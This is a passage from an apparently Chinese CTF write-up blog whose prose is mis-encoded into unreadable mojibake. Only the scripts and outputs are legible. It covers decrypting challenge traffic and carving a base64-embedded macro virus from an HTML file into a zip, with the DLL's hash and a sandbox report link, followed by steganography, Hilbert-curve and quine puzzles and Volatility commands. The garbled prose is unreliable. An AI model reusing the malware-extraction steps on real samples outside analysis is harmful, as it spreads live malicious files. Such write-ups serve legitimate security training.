res_aes().decrypt(res[:<span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v        = <span class="subst">&#123;dec_res[<span class="number">0</span>:<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;opt      = <span class="subst">&#123;dec_res[<span class="number">1</span>:<span class="number">2</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;dec_res[<span class="number">2</span>:<span class="number">3</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c_l      = <span class="subst">&#123;dec_res[<span class="number">3</span>:<span class="number">4</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">cmd_len = <span class="built_in">int</span>(dec_res[<span class="number">3</span>:<span class="number">4</span>].<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;dec_res[<span class="number">4</span>:<span class="number">4</span>+cmd_len].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">data = res[<span class="number">4</span> + cmd_len:]</span><br><span class="line">plaintext = decrypt(data, <span class="built_in">bytes</span>.fromhex(res_key), <span class="built_in">bytes</span>.fromhex(res_iv))</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºå¾—åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res_key  = b22984cda4143a919b5b6de8121b6159</span><br><span class="line">res_iv   = fa2a8ab0fadb4854943df690335a99b5</span><br><span class="line">v        = a2</span><br><span class="line">opt      = 00</span><br><span class="line">cmd      = 00</span><br><span class="line">c_l      = 00</span><br><span class="line">cmd      = </span><br><span class="line">dat_iv   = b22984cda4143a919b5b6de8121b6159</span><br><span class="line">dat_key  = fa2a8ab0fadb4854943df690335a99b5</span><br></pre></td></tr></table></figure>

<h3 id="è§£å¯†ä¹‹åæ‰€å¾—æ–‡ä»¶"><a href="#è§£å¯†ä¹‹åæ‰€å¾—æ–‡ä»¶" class="headerlink" title="è§£å¯†ä¹‹åæ‰€å¾—æ–‡ä»¶"></a>è§£å¯†ä¹‹åæ‰€å¾—æ–‡ä»¶</h3><p>è§£å¯†æ‰€å¾—æ–‡ä»¶ä¸ºä¸€ä¸ª html æ–‡ä»¶ï¼Œå…¶ä¸­ä»¥ base64 ç¼–ç å­˜æ”¾æœ‰ä¸€ä»½å®ç—…æ¯’ã€‚å› æ­¤è¿™é‡Œå–å‡ºå…¶å†…å®¹ï¼Œå®æµ‹ç”µè„‘ä¸­çš„æ€æ¯’è½¯ä»¶å¯¹æ­¤ç—…æ¯’ååˆ†æ•æ„Ÿï¼Œä¸€æ—¦è½å…¥æ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶ç«‹åˆ»ä¼šè¢«æŸåï¼Œæœ€åä¸ºäº†æŸ¥çœ‹å†…å®¹ç›´æ¥å­˜å‚¨ä¸º zip æ–‡ä»¶è§£å‹åæŸ¥çœ‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(i.decode() <span class="keyword">for</span> i <span class="keyword">in</span> plaintext)</span><br><span class="line">start = data.find(<span class="string">&quot;atob(&#x27;&quot;</span>) + <span class="built_in">len</span>(<span class="string">&quot;atob(&#x27;&quot;</span>)</span><br><span class="line">end = data.find(<span class="string">&quot;&#x27;);&quot;</span>, start)</span><br><span class="line"></span><br><span class="line">binary = b64decode(data[start:end])</span><br><span class="line">check_sum = hashlib.sha256(binary).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;doc.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(binary)</span><br></pre></td></tr></table></figure>

<p><em>è¿™ä¸€æ­¥ï¼Œå¦‚æ­¤å¦‚æ­¤è¿™èˆ¬è¿™èˆ¬å°±å¾—åˆ°htmlæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸ºå®ç—…æ¯’æ–‡ä»¶ã€‚æš‚ä¸”ç¼˜ç”±ä¸å¤ªç†è§£ï¼Œå…ˆæ”¾ç€ã€‚</em></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421105016271.png" class="" title="image-20230421105016271">

<h3 id="åˆ©ç”¨ç—…æ¯’sha256å€¼åå‘æŸ¥æ‰¾"><a href="#åˆ©ç”¨ç—…æ¯’sha256å€¼åå‘æŸ¥æ‰¾" class="headerlink" title="åˆ©ç”¨ç—…æ¯’sha256å€¼åå‘æŸ¥æ‰¾"></a>åˆ©ç”¨ç—…æ¯’sha256å€¼åå‘æŸ¥æ‰¾</h3><p>æŠŠzipæ–‡ä»¶ç›´æ¥æ”¾<code>foremost</code>åˆ†æä¸€ä¸‹ï¼Œèƒ½å¤Ÿå¾—åˆ°ç—…æ¯’çš„dllã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sha256sum 00000277.dll</span><br><span class="line">0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1  00000277.dll</span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423172325054.png" class="" title="image-20230423172325054">

<p>æ£€ç´¢å¾—åˆ°ï¼š<a href="https://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919">Malware analysis extracted_at_0x22a7b.exe Malicious activity | ANY.RUN - Malware Sandbox Online</a></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421150620900.png" class="" title="image-20230421150620900">

<p>å¾—åˆ°apiçš„<code>url</code>ä¸º<code>http://api.ipify.org</code></p>
<p>md5å¾—åˆ°å‹ç¼©å¯†ç ä¸º<code>08229f4052dde89671134f1784bed2d6</code></p>
<p>å¾—åˆ°<code>flag</code>æ–‡ä»¶ã€‚</p>
<h2 id="goæ–‡ä»¶"><a href="#goæ–‡ä»¶" class="headerlink" title="goæ–‡ä»¶"></a>goæ–‡ä»¶</h2><p>å¾—åˆ°çš„æ–‡ä»¶ä½¿ç”¨<code>WINHEX</code>æ‰“å¼€ä¸€ä¸‹ï¼Œå‘ç°æç¤ºäº†æ–‡ä»¶ç±»å‹ï¼Œæ˜¯<code>Gob</code>æ–‡ä»¶</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421151511429.png" class="" title="image-20230421151511429">

<p>åˆ©ç”¨å±æ€§æ¥è¿›è¡Œå®šä¹‰ï¼Œä»è€Œååºåˆ—åŒ–ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421152349138.png" class="" title="image-20230421152349138">



<p>å¯¼åŒ…çš„æ—¶å€™å‡ºç°äº†<code>missing path</code>ï¼Œæ‰¾äº†æŠ¥é”™åŸå› ï¼Œæ²¡è§£å†³ï¼Œåæ¥å‘ç°æ˜¯å› ä¸ºæ ¼å¼é”™äº†ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><em>ç„¶åè„šæœ¬çš„åŸç†æš‚ä¸”è¿˜ä¸å¤ªç†è§£ï¼Œå…ˆæ”¾ç€ã€‚</em></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//seed init</span></span><br><span class="line">	loc, _ := time.LoadLocation(<span class="string">&quot;Local&quot;</span>)</span><br><span class="line">	timeObj, _ := time.ParseInLocation(</span><br><span class="line">		<span class="string">&quot;2006-01-02 15:04:05&quot;</span>,</span><br><span class="line">		<span class="string">&quot;2022-07-19 14:49:56&quot;</span>, loc)</span><br><span class="line">	seed := timeObj.Unix()</span><br><span class="line">	rand.Seed(seed)</span><br><span class="line"></span><br><span class="line">	input, _ := os.Open(<span class="string">&quot;./src.png&quot;</span>)</span><br><span class="line">	in := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">70475</span>)</span><br><span class="line">	lenx, _ := input.Read(in)</span><br><span class="line">	table := <span class="built_in">make</span>([]<span class="type">int</span>, lenx)</span><br><span class="line">	out := <span class="built_in">make</span>([]<span class="type">byte</span>, lenx)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; lenx; i++ &#123;</span><br><span class="line">		table[i] = i</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//shuffle</span></span><br><span class="line">	rand.Shuffle(<span class="built_in">len</span>(table), <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">		table[i], table[j] = table[j], table[i]</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; lenx; i++ &#123;</span><br><span class="line">		out[table[i]] = in[i]</span><br><span class="line">	&#125;</span><br><span class="line">	output, _ := os.Create(<span class="string">&quot;./flag.png&quot;</span>)</span><br><span class="line">	output.Write(out)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å›¾ç‰‡ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/flag.png" class="" title="flag">

<h2 id="å›¾ç‰‡éšå†™"><a href="#å›¾ç‰‡éšå†™" class="headerlink" title="å›¾ç‰‡éšå†™"></a>å›¾ç‰‡éšå†™</h2><p><em>æå‡ºä¸€å¼ å›¾ç‰‡äº†ï¼Œä½†æ²¡æ˜ç™½ä¸ºå•¥å›¾ç‰‡çš„å¤§å°å°±æ˜¯<code>70450bytes</code>ï¼Œæœ‰ç‚¹è¿·æƒ‘ã€‚</em></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421155213728.png" class="" title="image-20230421155213728">

<p>æ²¡æ‰¾åˆ°åˆé€‚çš„å·¥å…·æå–éšå†™ï¼Œåæœ‰å…«ä¹æ˜¯æå–åƒç´ ç‚¹çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">arr = np.array(img)</span><br><span class="line"></span><br><span class="line">ans = <span class="built_in">bytes</span>(arr[:, :, <span class="number">3</span>].reshape(<span class="number">2000</span> * <span class="number">973</span>)).replace(<span class="string">b&#x27;\xff&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).decode()[:<span class="number">42</span>]</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="comment"># flag&#123;898161df-fabf-4757-82b6-ffe407c69475&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># from PIL import Image</span></span><br><span class="line"><span class="comment"># pic = Image.open(&#x27;flag.png&#x27;)</span></span><br><span class="line"><span class="comment"># w, h = pic.size</span></span><br><span class="line"><span class="comment"># flag = []</span></span><br><span class="line"><span class="comment"># for i in range(h):</span></span><br><span class="line"><span class="comment">#     for j in range(w):</span></span><br><span class="line"><span class="comment">#         piexl = list(pic.getpixel((j, i)))[3]</span></span><br><span class="line"><span class="comment">#         if(piexl != 0xff):</span></span><br><span class="line"><span class="comment">#             flag.append(chr(int(piexl)))</span></span><br><span class="line"><span class="comment">#             if len(flag) == 42:</span></span><br><span class="line"><span class="comment">#                 print(&#x27;&#x27;.join(flag))</span></span><br></pre></td></tr></table></figure>

<p>æœ€åå¾—åˆ°<code>flag&#123;898161df-fabf-4757-82b6-ffe407c69475&#125;</code></p>
<h1 id="qwb-2021-threebody"><a href="#qwb-2021-threebody" class="headerlink" title="[qwb-2021]threebody"></a>[qwb-2021]threebody</h1><blockquote>
<p><a href="https://www.anquanke.com/post/id/244533">ç”¨å›¾ç‰‡è®²ä¸€ä¸ªæ•…äº‹â€”â€”ç¬¬äº”å±Šå¼ºç½‘æ¯Threebodyé¢˜ç›®å®˜æ–¹é¢˜è§£-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>
</blockquote>
<h2 id="stegsolveæŸ¥çœ‹å‘ç°å›¾ç‰‡"><a href="#stegsolveæŸ¥çœ‹å‘ç°å›¾ç‰‡" class="headerlink" title="stegsolveæŸ¥çœ‹å‘ç°å›¾ç‰‡"></a>stegsolveæŸ¥çœ‹å‘ç°å›¾ç‰‡</h2><p>ä½ ä»¬éƒ½æ˜¯è™«å­ã€‚</p>
<h2 id="æ”¾å¤§å‘ç°åƒç´ ç‚¹æ•°"><a href="#æ”¾å¤§å‘ç°åƒç´ ç‚¹æ•°" class="headerlink" title="æ”¾å¤§å‘ç°åƒç´ ç‚¹æ•°"></a>æ”¾å¤§å‘ç°åƒç´ ç‚¹æ•°</h2><p>ç›¸é‚»åƒç´ ç‚¹æ•°å€¼ç›¸å·®è¾ƒå¤§ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230308100114529.png" class="" title="image-20230308100114529">

<p>ä»”ç»†è§‚å¯Ÿå‘ç°å¦‚æœä»¥4ä¸ºå‘¨æœŸç›¸å·®åƒç´ ç‚¹æ•°å€¼å°†ç›¸å·®ä¸å¤§ã€‚ -&gt; ä¿®æ”¹åƒç´ ç‚¹æ‰€å æ¯”ç‰¹æ•°<code>biBitCount 24 -&gt; 32</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230308094743609.png" class="" title="image-20230308094743609">

<p>å¾—åˆ°çœŸå®å›¾ç‰‡ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/threebody_output.bmp" class="" title="true threebody">

<h2 id="å†ä½¿ç”¨solvesolveè¿›è¡Œåˆ†æ"><a href="#å†ä½¿ç”¨solvesolveè¿›è¡Œåˆ†æ" class="headerlink" title="å†ä½¿ç”¨solvesolveè¿›è¡Œåˆ†æ"></a>å†ä½¿ç”¨solvesolveè¿›è¡Œåˆ†æ</h2><img src="/2023/03/09/MISC-Write-Up-zh/image-20230215130857823.png" class="">

<p><code>stegsolve</code>è¿›è¡Œæå–ã€‚è¡Œåˆ—éƒ½å­˜åœ¨éšå†™æ•°æ®ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/steg1.png" class="" title="row">

<img src="/2023/03/09/MISC-Write-Up-zh/steg2.png" class="">

<p>å¯å¾—æç¤º<code>å¸Œå°”ä¼¯ç‰¹æ›²çº¿</code></p>
<h2 id="å†—ä½™æ•°æ®èµ‹å€¼"><a href="#å†—ä½™æ•°æ®èµ‹å€¼" class="headerlink" title="å†—ä½™æ•°æ®èµ‹å€¼"></a>å†—ä½™æ•°æ®èµ‹å€¼</h2><p>è§‚å¯Ÿå›¾ç‰‡å‘ç°å­˜åœ¨<code>rgbReserved</code>çš„å­—æ®µï¼Œè¡¨ç¤º<code>stegsolve</code>è¿˜å­˜åœ¨æ— æ³•è¯†åˆ«çš„é€šé“ã€‚</p>
<p>ä¸¤ç§æ–¹æ³•ã€‚</p>
<ul>
<li><code>bmp</code>è½¬åŒ–æˆ<code>png</code></li>
<li><code>blue</code>é€šé“è·Ÿ<code>Reserved</code>é€šé“å¤§å°ç›¸è¿‘ï¼Œç›´æ¥æš´åŠ›èµ‹å€¼</li>
</ul>
<h3 id="bmpè½¬åŒ–æˆpng"><a href="#bmpè½¬åŒ–æˆpng" class="headerlink" title="bmpè½¬åŒ–æˆpng"></a>bmpè½¬åŒ–æˆpng</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image=Image.new(mode=<span class="string">&#x27;RGBA&#x27;</span>,size=(<span class="number">580</span>,<span class="number">435</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;threebody.bmp&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file=f.read()</span><br><span class="line">    index=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">434</span>,-<span class="number">1</span>,-<span class="number">1</span>):  <span class="comment">#æ ¹æ®bmpçš„ç»“æ„çŸ¥é“è¯¥bmpæ–‡ä»¶ä¸Šä¸‹å€’åºå­˜å‚¨åƒç´ å€¼</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">580</span>):</span><br><span class="line">            s=[]</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">                s.append(file[index])</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">            image.putpixel((j,i),(s[<span class="number">2</span>],s[<span class="number">1</span>],s[<span class="number">0</span>],s[<span class="number">3</span>]))  <span class="comment">#</span></span><br><span class="line">    image.show()</span><br><span class="line">    image.save(<span class="string">&#x27;threebody_new.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="æš´åŠ›èµ‹å€¼"><a href="#æš´åŠ›èµ‹å€¼" class="headerlink" title="æš´åŠ›èµ‹å€¼"></a>æš´åŠ›èµ‹å€¼</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody.bmp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d = f.read()</span><br><span class="line"></span><br><span class="line">w = <span class="number">580</span></span><br><span class="line">h = <span class="number">435</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line">l = <span class="built_in">bytearray</span>(d)</span><br><span class="line">off = l[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        l[off+j*b+i*b*w] = l[off+j*b+i*b*w+<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody_new.bmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(l)</span><br></pre></td></tr></table></figure>



<h2 id="å¸Œå°”ä¼¯ç‰¹æ›²çº¿"><a href="#å¸Œå°”ä¼¯ç‰¹æ›²çº¿" class="headerlink" title="å¸Œå°”ä¼¯ç‰¹æ›²çº¿"></a>å¸Œå°”ä¼¯ç‰¹æ›²çº¿</h2><blockquote>
<p>reference: <a href="https://mp.weixin.qq.com/s/IOSGOJnGyiGoD8J1ITQJlg">çœŸÂ·é™ç»´æ‰“å‡»ï¼ã€Šä¸‰ä½“ã€‹ä¸­äºŒå‘ç®”åå™¬åœ°çƒçš„åœºæ™¯æˆçœŸäº†ï¼è¿™ä½Bç«™Upä¸»è¿‡äºç¡¬æ ¸â€¦â€¦ (qq.com)</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment">#å®‰è£…ï¼špip install -i https://pypi.tuna.tsinghua.edu.cn/simple hilbertcurve</span></span><br><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="comment">#æå–åƒç´ æ•°æ®</span></span><br><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(<span class="string">&#x27;threebody_new.png&#x27;</span>) <span class="keyword">as</span> img:</span><br><span class="line">    arr = np.asarray(img)</span><br><span class="line">arr = np.vectorize(<span class="keyword">lambda</span> x: x&amp;<span class="number">1</span>)(arr[:,:,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#ç¡®å®šå›¾ç‰‡ä¸­çš„æœ‰æ•ˆåŒºåŸŸ</span></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">0</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> x2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">0</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">1</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">1</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#å‰ªåˆ‡å‡ºæœ‰æ•ˆäºŒç»´æ•°æ®</span></span><br><span class="line">arr = arr[x1:x2+<span class="number">1</span>, y1:y2+<span class="number">1</span>]</span><br><span class="line"><span class="comment">#print(x2+1-x1)#å¾—å‡ºæ˜¯128*128çš„çŸ©é˜µ</span></span><br><span class="line"><span class="comment">#æ„å»ºå¸Œå°”ä¼¯ç‰¹æ›²çº¿å¯¹è±¡</span></span><br><span class="line">hilbert_curve = HilbertCurve(<span class="number">7</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">#ç”Ÿæˆä¸€ç»´çš„äºŒè¿›åˆ¶æµæ•°æ®</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr)):</span><br><span class="line">    [x,y] = hilbert_curve.point_from_distance(i)</span><br><span class="line">    s += <span class="built_in">str</span>(arr[<span class="number">127</span>-y][x])</span><br><span class="line"><span class="comment">#è½¬ASCIIæ–‡æœ¬å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">int</span>(s,<span class="number">2</span>).to_bytes(<span class="number">2048</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>ä½†è¿™ä¸ªä¸€ç›´æ²¡èƒ½å®ç°ï¼Œä¸æ¸…æ¥šæ˜¯ä¸æ˜¯æ²¡å‰ªåˆ‡å›¾ç‰‡çš„åŸå› ã€‚</em></p>
<p><em><strong>0228ï¼Œç¬‘æ­»ï¼ŒçœŸçš„æ˜¯å› ä¸ºæ²¡å‰ªåˆ‡çš„åŸå› ã€‚</strong></em></p>
<h2 id="Cè¯­è¨€ç¼–è¯‘"><a href="#Cè¯­è¨€ç¼–è¯‘" class="headerlink" title="Cè¯­è¨€ç¼–è¯‘"></a>Cè¯­è¨€ç¼–è¯‘</h2><p>æ‰“å¼€<code>output.txt</code>å‘ç°æ˜¯Cè¯­è¨€è„šæœ¬ï¼Œæ‰€ä»¥ç”¨VSCodeè¿›è¡Œç¼–è¯‘è¿è¡Œï¼Œå‘ç°æ‰“å°çš„æ˜¯è‡ªèº«ã€‚</p>
<blockquote>
<p>å‡ºé¢˜äººçš„çŸ¥è¯†ç‚¹ï¼š</p>
<p>è¿™ç§å¯ä»¥æ‰“å°è‡ªèº«çš„ç¨‹åºå­¦åå«Quine</p>
</blockquote>
<p>å³ä½¿çœ‹ä¼¼æ˜¯ç›¸åŒçš„æ–‡ä»¶ï¼Œå¯èƒ½å­˜åœ¨æŸç§å·®å¼‚ï¼Œç›´æ¥ç”¨<code>BCompare4</code>å¯¹åŸå§‹æ–‡ä»¶ä»¥åŠè¾“å‡ºæ–‡ä»¶è¿›è¡Œå¯¹æ¯”ï¼Œå‘ç°åœ¨æ–‡ä»¶çš„ç¬¬11è¡Œå­˜åœ¨å·®åˆ«ã€‚</p>
<p>åŸå§‹æ–‡ä»¶å­˜åœ¨<code>Tab</code>ä»¥åŠ<code>Space</code>ï¼Œè½¬åŒ–æˆ<code>01</code>æ•°æ®æµã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230228110003750.png" class="" title="image-20230228110003750">

<p>ç”¨<code>Notepad++</code>å¾—åˆ°<code>01</code>æ•°æ®æµã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span><br></pre></td></tr></table></figure>

<h2 id="æ•°æ®å¤„ç†"><a href="#æ•°æ®å¤„ç†" class="headerlink" title="æ•°æ®å¤„ç†"></a>æ•°æ®å¤„ç†</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output = <span class="string">&#x27;2009092020090920200909200909202020090920202020092009092020090909200909090920090920092020200920202020090920202009200909200909200920092020200920092009092009090920202009092009200920090920092020092020090920202020200909200909092020092020202020092009092009092020200920090909090920092009202020202009090920200920202009092020202020200909200909202020090920202009200909202009200920090920090920092009090909092009&#x27;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">output = output.replace(<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;09&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># print(output)</span></span><br><span class="line"><span class="comment"># 01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;.&#123;8&#125;&#x27;</span>, output)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;D1mEn5i0nAl_Pr061em&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="æŠ¤ç½‘æ¯2018-easy-dump"><a href="#æŠ¤ç½‘æ¯2018-easy-dump" class="headerlink" title="[æŠ¤ç½‘æ¯2018]easy_dump"></a>[æŠ¤ç½‘æ¯2018]easy_dump</h1><h2 id="åˆ©ç”¨volæŸ¥çœ‹é•œåƒä¿¡æ¯"><a href="#åˆ©ç”¨volæŸ¥çœ‹é•œåƒä¿¡æ¯" class="headerlink" title="åˆ©ç”¨volæŸ¥çœ‹é•œåƒä¿¡æ¯"></a>åˆ©ç”¨volæŸ¥çœ‹é•œåƒä¿¡æ¯</h2><p><code>vol.py -f easy_dump.img imageinfo</code><img src="/2023/03/09/MISC-Write-Up-zh/image-20230309102823595.png" class="" title="image-20230309102823595"></p>
<p><em>ä¸€èˆ¬ä»¥é•œåƒå‰1ï¼Œ2ä¸ªæ“ä½œç³»ç»Ÿä¸ºåˆ†æé‡ç‚¹ï¼Œeg: Win7SP1x64</em></p>
<h2 id="æŒ‡å®šé•œåƒè¿›è¡Œè¿›ç¨‹æ‰«æ"><a href="#æŒ‡å®šé•œåƒè¿›è¡Œè¿›ç¨‹æ‰«æ" class="headerlink" title="æŒ‡å®šé•œåƒè¿›è¡Œè¿›ç¨‹æ‰«æ"></a>æŒ‡å®šé•œåƒè¿›è¡Œè¿›ç¨‹æ‰«æ</h2><p><code>vol.py -f easy_dump.img --profile=WinSP1x64 pslist</code></p>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 pstree</code></p>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 psscan</code></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230309103714601.png" class="" title="image-20230309103714601">

